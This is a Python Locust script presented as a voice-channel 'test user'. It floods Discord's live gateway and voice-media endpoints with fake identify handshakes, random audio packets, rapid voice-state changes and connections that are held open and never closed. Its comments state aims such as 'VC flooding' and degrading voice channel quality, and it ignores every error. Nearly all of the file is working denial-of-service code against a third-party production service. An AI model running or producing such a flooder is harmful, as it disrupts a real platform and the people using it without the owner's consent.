from gevent import monkey
monkey.patch_all()

import uuid
import random
import string
from locust import User, task, between
import threading
import time
import websocket
import json
import struct

class DiscordVCTestUser(User):
    wait_time = between(0.05, 0.2)  # Very aggressive wait time for VC flooding
    
    def on_start(self):
        # Initialize session for connection reuse
        self.session_id = str(uuid.uuid4())
        self.voice_connections = []
        self.audio_buffers = []
        self.ws_connections = []
        
    @task(5)
    def voice_connection_flood(self):
        # Generate random user IDs and tokens
        user_id = str(random.randint(100000000000000000, 999999999999999999))
        session_id = str(uuid.uuid4())
        
        # Create multiple voice connections
        for _ in range(random.randint(1, 3)):
            try:
                # WebSocket connection to Discord voice servers
                ws_url = f"wss://random.discord.media/rtc?v=5"
                
                # Simulate voice connection handshake
                handshake_data = {
                    "op": 0,
                    "d": {
                        "server_id": str(random.randint(100000000000000000, 999999999999999999)),
                        "user_id": user_id,
                        "session_id": session_id,
                        "token": ''.join(random.choices(string.ascii_letters + string.digits, k=60)),
                        "video": False,
                        "streams": [{"type": "video", "rid": "100", "quality": 100}]
                    }
                }
                
                # Create websocket connection (simulated)
                ws = websocket.create_connection(ws_url, timeout=5)
                self.ws_connections.append(ws)
                
                # Send handshake
                ws.send(json.dumps(handshake_data))
                
                # Send multiple audio packets
                for _ in range(random.randint(10, 50)):
                    # Generate random audio packet
                    audio_packet = self._generate_audio_packet()
                    ws.send(audio_packet)
                    
                    # Small delay to simulate real-time audio
                    time.sleep(random.uniform(0.01, 0.05))
                    
            except Exception as e:
                pass  # Ignore connection errors
    
    def _generate_audio_packet(self):
        # Generate a fake audio packet with random data
        packet_size = random.randint(100, 1000)
        sequence = random.randint(0, 65535)
        timestamp = random.randint(0, 4294967295)
        ssrc = random.randint(0, 4294967295)
        
        # Create RTP-like header (simplified)
        header = struct.pack('!BBHII', 
                           0x80,  # Version 2, no padding, no extension, no CSRC
                           0x78,  # Payload type 120 (Opus)
                           sequence,
                           timestamp,
                           ssrc
                           )
        
        # Generate random audio data
        audio_data = bytes([random.randint(0, 255) for _ in range(packet_size)])
        
        return header + audio_data
    
    @task(3)
    def voice_state_spam(self):
        # Rapidly change voice states
        for _ in range(random.randint(5, 15)):
            try:
                # Create websocket connection
                ws_url = "wss://gateway.discord.gg/?v=9&encoding=json"
                ws = websocket.create_connection(ws_url, timeout=5)
                self.ws_connections.append(ws)
                
                # Send identify
                identify_data = {
                    "op": 2,
                    "d": {
                        "token": ''.join(random.choices(string.ascii_letters + string.digits, k=60)),
                        "intents": 32767,
                        "properties": {
                            "os": "Windows",
                            "browser": "Discord Client",
                            "device": "Windows"
                        }
                    }
                }
                ws.send(json.dumps(identify_data))
                
                # Send voice state updates
                for _ in range(random.randint(3, 10)):
                    voice_state = {
                        "op": 4,
                        "d": {
                            "guild_id": str(random.randint(100000000000000000, 999999999999999999)),
                            "channel_id": str(random.randint(100000000000000000, 999999999999999999)),
                            "self_mute": random.choice([True, False]),
                            "self_deaf": random.choice([True, False]),
                        }
                    }
                    ws.send(json.dumps(voice_state))
                    time.sleep(random.uniform(0.01, 0.1))
                    
            except Exception as e:
                pass  # Ignore errors
    
    @task(2)
    def audio_quality_degradation(self):
        # Send low-quality or corrupted audio to degrade voice channel quality
        for _ in range(random.randint(1, 3)):
            try:
                ws_url = f"wss://random.discord.media/rtc?v=5"
                ws = websocket.create_connection(ws_url, timeout=5)
                self.ws_connections.append(ws)
                
                # Send handshake
                handshake_data = {
                    "op": 0,
                    "d": {
                        "server_id": str(random.randint(100000000000000000, 999999999999999999)),
                        "user_id": str(random.randint(100000000000000000, 999999999999999999)),
                        "session_id": str(uuid.uuid4()),
                        "token": ''.join(random.choices(string.ascii_letters + string.digits, k=60)),
                        "video": False,
                    }
                }
                ws.send(json.dumps(handshake_data))
                
                # Send corrupted or low-quality audio
                for _ in range(random.randint(20, 100)):
                    # Generate intentionally corrupted audio
                    corrupted_packet = bytes([random.randint(0, 255) for _ in range(random.randint(50, 200))])
                    ws.send(corrupted_packet)
                    time.sleep(random.uniform(0.01, 0.03))
                    
            except Exception as e:
                pass  # Ignore errors
    
    @task(1)
    def connection_exhaustion(self):
        # Open and maintain many connections without properly closing them
        for _ in range(random.randint(5, 20)):
            try:
                # Create multiple websocket connections
                ws_url = "wss://gateway.discord.gg/?v=9&encoding=json"
                ws = websocket.create_connection(ws_url, timeout=5)
                self.ws_connections.append(ws)
                
                # Send identify
                identify_data = {
                    "op": 2,
                    "d": {
                        "token": ''.join(random.choices(string.ascii_letters + string.digits, k=60)),
                        "intents": 32767,
                        "properties": {
                            "os": "Windows",
                            "browser": "Discord Client",
                            "device": "Windows"
                        }
                    }
                }
                ws.send(json.dumps(identify_data))
                
                # Send heartbeat but don't close connection
                for _ in range(random.randint(1, 5)):
                    heartbeat = {
                        "op": 1,
                        "d": random.randint(100000000000000000, 999999999999999999)
                    }
                    ws.send(json.dumps(heartbeat))
                    time.sleep(random.uniform(0.5, 2.0))
                    
            except Exception as e:
                pass  # Ignore timeouts and connection errors
